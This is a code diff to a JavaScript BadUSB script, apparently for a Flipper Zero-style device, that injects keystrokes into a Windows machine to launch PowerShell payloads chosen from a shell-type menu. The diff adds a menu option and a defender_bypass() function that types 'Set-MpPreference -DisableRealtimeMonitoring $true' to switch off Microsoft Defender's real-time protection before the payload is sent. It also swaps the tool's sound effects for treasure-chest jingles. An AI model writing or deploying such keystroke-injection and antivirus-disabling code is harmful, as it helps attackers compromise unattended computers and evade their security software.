@@ -54,18 +54,31 @@ function play(note, duration, wait, octave){
     delay(wait);
 }
 
-function victory() {
-    play("C", 40, 10, 2);
-    play("G", 100, 150, 2);
-    play("C", 60, 10, 2);
-    play("G", 400, 10, 2);
+let loading_state = 0;
+function chest_open() {
+    if (loading_state === 0) {
+        for (let i = 0; i < 2; i++) {play("G", 100, 0, 1);play("A", 100, 0, 1);play("B", 100, 0, 1);play("C#", 100, 0, 2);}
+    } else if (loading_state === 1) {
+        for (let i = 0; i < 2; i++) {play("G#", 95, 0, 1);play("A#", 95, 0, 1);play("C", 95, 0, 2);play("D", 95, 0, 2);}
+    } else if (loading_state === 2) {
+        for (let i = 0; i < 2; i++) {play("A", 90, 0, 0.5);play("B", 90, 0, 0.5);play("C#", 90, 0, 1);play("D#", 90, 0, 1);}
+    } else if (loading_state === 3) {
+        for (let i = 0; i < 2; i++) {play("A#", 85, 0, 0.5);play("C", 85, 0, 1);play("D", 85, 0, 1);play("E", 85, 0, 1);}
+    } else if (loading_state === 4) {
+        play("B", 80, 0, 0.5);play("C#", 80, 0, 1);play("D#", 80, 0, 1);play("F", 80, 0, 1);
+    } else if (loading_state === 5) {
+        play("C", 75, 0, 1);play("D", 75, 0, 1);play("E", 75, 0, 1);play("F#", 75, 0, 1);
+    } else if (loading_state === 6) {
+        play("C#", 70, 0, 1);play("D#", 70, 0, 1);play("F", 70, 0, 1);play("G", 70, 0, 1);
+    } else if (loading_state === 7) {
+        play("D", 65, 0, 1);play("E", 65, 0, 1);play("F#", 65, 0, 1);play("G#", 65, 0, 1);
+    } else {
+        delay(1000);
+    }
 }
 
-function go_in() {
-    play("C", 10, 0, 6);
-    play("G", 10, 0, 5);
-    play("D", 10, 0, 4);
-    play("C", 10, 0, 3);
+function chest_loot() {
+    play("A", 150, 0, 1);play("A#", 150, 0, 1);play("B", 150, 0, 1);play("C", 350, 0, 2);
 }
 
 let keyboard = require('keyboard');
@@ -101,6 +114,13 @@ if (os === 0 || os === 1) {
     submenu.addItem("-> powershell #3", 7);
 }
 shellType = submenu.show();
+let disableDefender = 1;
+if (os === 2) {
+    submenu.setHeader("disable defender");
+    submenu.addItem("-> Yes !", 0);
+    submenu.addItem("-> No !", 1);
+    disableDefender = submenu.show();
+}
 
 let command = "";
 if (shellType === 0) { // a switch case implementation would come in handy :(
@@ -163,16 +183,27 @@ if (os === 0 || os === 1) {
 
 print("waiting for connection...");
 while (!badusb.isConnected()) {
-    delay(1000);
+    chest_open();
+    loading_state++; // dont let the chest_open function run forever ig xd
 }
 
 notify.blink("blue", "short");
-for (let i = 0; i < 3; i++) {
-    go_in();
-    delay(150);
+chest_open();
+
+function defender_bypass() {
+    print("disabling defender...");
+    badusb.press("GUI", "r");
+    delay(500);
+    badusb.println("powershell", 10);
+    delay(500);
+    badusb.println("Set-MpPreference -DisableRealtimeMonitoring $true", 10);
+    delay(500);
+    badusb.press("ALT", "F4");
+    delay(500);
 }
 
 if (shellType === 6 || shellType === 7) {
+    if (disableDefender === 0) {defender_bypass();}
     print("sending powershell payload...");
     badusb.press("GUI", "r");
     delay(500);
@@ -181,6 +212,7 @@ if (shellType === 6 || shellType === 7) {
     badusb.println(command, 10);
     delay(500);
 } else if (shellType === 5) {
+    if (disableDefender === 0) {defender_bypass();}
     print("sending powershell payload...");
     badusb.press("GUI", "x");
     delay(300);
@@ -210,5 +242,5 @@ if (shellType === 6 || shellType === 7) {
 }
 
 badusb.quit();
-victory();
+chest_loot();
 notify.blink("green", "long");
